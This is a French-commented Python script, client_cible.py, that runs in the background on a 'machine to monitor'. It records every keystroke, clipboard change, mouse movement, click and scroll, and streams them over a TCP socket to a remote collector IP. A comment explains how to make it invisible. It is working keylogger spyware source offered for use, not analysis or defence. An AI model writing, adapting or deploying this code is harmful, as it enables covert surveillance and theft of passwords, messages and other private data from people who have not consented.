# client_cible.py - Lance sur la machine à surveiller (en arrière-plan)
import socket
import pynput
from pynput import keyboard, mouse
import pyperclip
import threading
import datetime
import time

# Config : REMPLACE par l'IP de ta machine de monitoring
HOST = '192.168.1.100'  # ← TON IP ici (trouve-la avec `ip a` ou `ifconfig`)
PORT = 9999
buffer = ""
conn = None

def connecter():
    global conn
    while True:
        try:
            conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            conn.connect((HOST, PORT))
            print("Connecté au serveur monitoring !")  # Console (supprime si tu veux invisible)
            return True
        except:
            print("Échec connexion... Retry dans 5s...")
            time.sleep(5)

def envoyer(texte):
    global conn, buffer
    buffer += texte
    if len(buffer) > 1000:  # Envoi par paquets pour éviter surcharge
        try:
            conn.send(buffer.encode('utf-8'))
            buffer = ""
        except:
            pass

def clipboard_loop():
    last = ""
    while True:
        try:
            cur = pyperclip.paste()
            if cur != last and cur:
                ts = datetime.datetime.now().strftime("%H:%M:%S")
                msg = f"\n[CLIPBOARD {ts}]\n{cur[:200]}...\n\n"
                envoyer(msg)
                last = cur
        except: pass
        time.sleep(2)

# Clavier
def on_press(key):
    try:
        if hasattr(key, 'char') and key.char:
            envoyer(key.char)
        else:
            specials = {
                keyboard.Key.space: " ",
                keyboard.Key.enter: "\n",
                keyboard.Key.tab: "\t",
                keyboard.Key.backspace: " [BACKSPACE] ",
                keyboard.Key.delete: " [SUPPR] ",
            }
            txt = specials.get(key, f" [{str(key).split('.')[-1].upper()}] ")
            envoyer(txt)
    except: pass

# Souris
dernier_move = None
def on_move(x, y):
    global dernier_move
    if dernier_move is None or abs(x - dernier_move[0]) > 20 or abs(y - dernier_move[1]) > 20:
        envoyer(f" [MOUSE → ({x}, {y})] ")
        dernier_move = (x, y)

def on_click(x, y, button, pressed):
    if pressed:
        btn = {mouse.Button.left: "GAUCHE", mouse.Button.right: "DROIT"}.get(button, "AUTRE")
        ts = datetime.datetime.now().strftime("%H:%M:%S")
        msg = f"\n[CLIC {btn} @ ({x},{y}) - {ts}]\n"
        envoyer(msg)

def on_scroll(x, y, dx, dy):
    dir = "↑" if dy > 0 else "↓"
    envoyer(f" [SCROLL {dir} @ ({x},{y})] ")

# Lancement
if __name__ == "__main__":
    if connecter():
        # Threads
        threading.Thread(target=clipboard_loop, daemon=True).start()
        mouse_listener = mouse.Listener(on_move=on_move, on_click=on_click, on_scroll=on_scroll)
        mouse_listener.start()
        kb_listener = keyboard.Listener(on_press=on_press)
        kb_listener.start()
        
        # Buffer flush périodique
        while True:
            time.sleep(5)
            if buffer:
                try:
                    conn.send(buffer.encode('utf-8'))
                    buffer = ""
                except:
                    print("Déconnexion... Retry...")
                    if not connecter():
                        break
    else:
        print("Impossible de se connecter. Vérifie l'IP et le port.")
